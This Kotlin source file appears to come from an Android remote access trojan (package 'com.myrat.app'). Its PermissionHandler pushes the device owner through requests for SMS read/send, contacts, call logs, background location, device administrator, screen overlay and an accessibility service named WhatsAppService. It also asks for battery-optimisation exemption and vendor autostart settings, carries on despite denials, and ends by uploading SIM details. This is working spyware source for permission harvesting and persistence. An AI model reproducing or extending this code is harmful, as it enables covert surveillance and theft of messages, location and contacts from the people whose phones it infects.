package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler
) {
    
    private val activityRef = WeakReference(activity)
    private var currentStep = 0
    private val totalSteps = 6
    private var permissionsRequested = false
    
    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_STORAGE_PERMISSIONS = 103
        private const val RC_BACKGROUND_LOCATION = 104
    }
    
    // Core SMS permissions
    private val smsPermissions = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS
    )
    
    // Phone permissions
    private val phonePermissions = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    )
    
    // Location permissions
    private val locationPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )
    
    // Storage permissions (version dependent)
    private val storagePermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.POST_NOTIFICATIONS
        )
    } else {
        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    fun requestPermissions() {
        val activity = activityRef.get() ?: return
        
        if (permissionsRequested) {
            Logger.log("Permissions already requested, skipping")
            return
        }
        
        Logger.log("Starting EasyPermissions permission flow")
        currentStep = 1
        permissionsRequested = true
        
        // Step 1: Request SMS permissions first
        requestSmsPermissions(activity)
    }

    private fun requestSmsPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting SMS permissions")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *smsPermissions)) {
                Logger.log("SMS permissions already granted")
                currentStep++
                requestPhonePermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_SMS_PERMISSIONS, *smsPermissions)
                    .setRationale("SMS permissions are required to receive, read, and send SMS messages for the app to function properly.")
                    .setPositiveButtonText("Grant")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting SMS permissions", e)
            currentStep++
            requestPhonePermissions(activity)
        }
    }

    private fun requestPhonePermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting phone permissions")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *phonePermissions)) {
                Logger.log("Phone permissions already granted")
                currentStep++
                requestLocationPermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_PHONE_PERMISSIONS, *phonePermissions)
                    .setRationale("Phone permissions are required to access phone state, make calls, read contacts, and call logs.")
                    .setPositiveButtonText("Grant")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting phone permissions", e)
            currentStep++
            requestLocationPermissions(activity)
        }
    }

    private fun requestLocationPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting location permissions")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *locationPermissions)) {
                Logger.log("Location permissions already granted")
                currentStep++
                requestStoragePermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_LOCATION_PERMISSIONS, *locationPermissions)
                    .setRationale("Location permissions are required to track device location for monitoring purposes.")
                    .setPositiveButtonText("Grant")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting location permissions", e)
            currentStep++
            requestStoragePermissions(activity)
        }
    }

    private fun requestStoragePermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting storage permissions")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *storagePermissions)) {
                Logger.log("Storage permissions already granted")
                currentStep++
                requestBackgroundLocation(activity)
                return
            }
            
            val rationale = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                "Media and notification permissions are required to access images and show notifications."
            } else {
                "Storage permission is required to access files and images on the device."
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_STORAGE_PERMISSIONS, *storagePermissions)
                    .setRationale(rationale)
                    .setPositiveButtonText("Grant")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting storage permissions", e)
            currentStep++
            requestBackgroundLocation(activity)
        }
    }

    private fun requestBackgroundLocation(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting background location")
        
        try {
            // Background location only needed on Android 10+
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                currentStep++
                requestSpecialPermissions(activity)
                return
            }
            
            if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                Logger.log("Background location already granted")
                currentStep++
                requestSpecialPermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_BACKGROUND_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    .setRationale("Background location access is needed to track location when the app is not actively being used.")
                    .setPositiveButtonText("Grant")
                    .setNegativeButtonText("Deny")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting background location", e)
            currentStep++
            requestSpecialPermissions(activity)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Checking special permissions")
        
        try {
            // These are NOT runtime permissions and should be handled via Settings intents
            val specialPermissions = mutableListOf<String>()
            
            // Battery optimization
            if (!isBatteryOptimizationDisabled(activity)) {
                specialPermissions.add("Battery Optimization")
            }
            
            // System alert window
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                specialPermissions.add("Display over other apps")
            }
            
            // Device admin
            if (!isDeviceAdminEnabled(activity)) {
                specialPermissions.add("Device Administrator")
            }
            
            // Accessibility service
            if (!isAccessibilityServiceEnabled(activity)) {
                specialPermissions.add("Accessibility Service")
            }
            
            // Exact alarms (Android 12+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                if (!alarmManager.canScheduleExactAlarms()) {
                    specialPermissions.add("Schedule Exact Alarms")
                }
            }
            
            if (specialPermissions.isNotEmpty()) {
                Logger.log("Special permissions needed: $specialPermissions")
                requestBatteryOptimization(activity)
            } else {
                Logger.log("All special permissions already granted")
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }
        } catch (e: Exception) {
            Logger.error("Error checking special permissions", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    // Callback methods for MainActivity to call
    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.log("Permissions granted for request $requestCode: $perms")
        
        try {
            when (requestCode) {
                RC_SMS_PERMISSIONS -> {
                    currentStep++
                    requestPhonePermissions(activity)
                }
                RC_PHONE_PERMISSIONS -> {
                    currentStep++
                    requestLocationPermissions(activity)
                }
                RC_LOCATION_PERMISSIONS -> {
                    currentStep++
                    requestStoragePermissions(activity)
                }
                RC_STORAGE_PERMISSIONS -> {
                    currentStep++
                    requestBackgroundLocation(activity)
                }
                RC_BACKGROUND_LOCATION -> {
                    currentStep++
                    requestSpecialPermissions(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.warn("Permissions denied for request $requestCode: $perms")
        
        try {
            // Check if some permissions are permanently denied
            if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                Logger.warn("Some permissions permanently denied: $perms")
                // Could show settings dialog here, but continue with flow
            }
            
            // Continue with next step regardless of denials
            when (requestCode) {
                RC_SMS_PERMISSIONS -> {
                    currentStep++
                    requestPhonePermissions(activity)
                }
                RC_PHONE_PERMISSIONS -> {
                    currentStep++
                    requestLocationPermissions(activity)
                }
                RC_LOCATION_PERMISSIONS -> {
                    currentStep++
                    requestStoragePermissions(activity)
                }
                RC_STORAGE_PERMISSIONS -> {
                    currentStep++
                    requestBackgroundLocation(activity)
                }
                RC_BACKGROUND_LOCATION -> {
                    currentStep++
                    requestSpecialPermissions(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting battery optimization disable")
        
        try {
            if (isBatteryOptimizationDisabled(activity)) {
                currentStep++
                requestOverlayPermission(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestOverlayPermission(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            currentStep++
            requestOverlayPermission(activity)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting overlay permission")
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)) {
                currentStep++
                requestDeviceAdmin(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestDeviceAdmin(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            currentStep++
            requestDeviceAdmin(activity)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting device admin")
        
        try {
            if (isDeviceAdminEnabled(activity)) {
                currentStep++
                requestAccessibilityService(activity)
                return
            }
            
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission allows the app to lock the device and manage security settings.")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestAccessibilityService(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            currentStep++
            requestAccessibilityService(activity)
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting accessibility service")
        
        try {
            if (isAccessibilityServiceEnabled(activity)) {
                currentStep++
                requestExactAlarms(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestExactAlarms(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            currentStep++
            requestExactAlarms(activity)
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting exact alarms permission")
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            if (alarmManager.canScheduleExactAlarms()) {
                currentStep++
                requestManufacturerSpecificSettings(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Opening manufacturer-specific settings")
        
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            Logger.log("Device manufacturer: $manufacturer")
            
            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(ComponentName("com.xiaomi.mipicks", "com.xiaomi.mipicks.ui.AppPicksTabActivity")),
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName)
        )
        
        tryLaunchIntents(activity, intents, "MIUI Security settings")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"))
        )
        
        tryLaunchIntents(activity, intents, "ColorOS Phone Manager")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Vivo iManager")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Huawei Phone Manager")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent().setComponent(ComponentName("com.samsung.android.sm_cn", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Samsung Device Care")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent().setComponent(ComponentName("com.android.settings", "com.android.settings.Settings\$HighPowerApplicationsActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "OnePlus Security")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.realme.rmm", "com.realme.rmm.ui.StartupAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Realme Phone Manager")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")
                    
                    // Finish after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }
        
        // Fallback to app settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }
        
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        Logger.log("Permission flow completed")
        
        try {
            // Upload SIM details after permissions are granted
            simDetailsHandler.uploadSimDetails()
        } catch (e: Exception) {
            Logger.error("Failed to upload SIM details", e)
        }
    }

    // Helper methods for checking permission states
    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }
        } catch (e: Exception) {
            Logger.error("Error checking battery optimization", e)
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            Logger.error("Error checking device admin", e)
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        
        try {
            // Check runtime permissions using EasyPermissions
            val allPermissions = smsPermissions + phonePermissions + locationPermissions + storagePermissions
            val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
            
            // Check background location separately
            val backgroundLocationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            } else {
                true
            }
            
            // Check special permissions
            val batteryOptimized = isBatteryOptimizationDisabled(activity)
            val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(activity)
            } else {
                true
            }
            val deviceAdminGranted = isDeviceAdminEnabled(activity)
            val accessibilityGranted = isAccessibilityServiceEnabled(activity)
            
            val exactAlarmsGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                alarmManager.canScheduleExactAlarms()
            } else {
                true
            }
            
            Logger.log("Permission status - Runtime: $runtimeGranted, Background: $backgroundLocationGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
            
            return runtimeGranted && backgroundLocationGranted && batteryOptimized && overlayGranted && deviceAdminGranted && accessibilityGranted && exactAlarmsGranted
        } catch (e: Exception) {
            Logger.error("Error checking permissions", e)
            return false
        }
    }

    fun handleResume() {
        try {
            // Check if all permissions are granted when activity resumes
            val activity = activityRef.get() ?: return
            
            if (areAllPermissionsGranted()) {
                Logger.log("All permissions granted on resume")
                finishPermissionFlow(activity)
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    fun cleanup() {
        try {
            // Clean up any resources
            Logger.log("PermissionHandler cleanup completed")
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }
}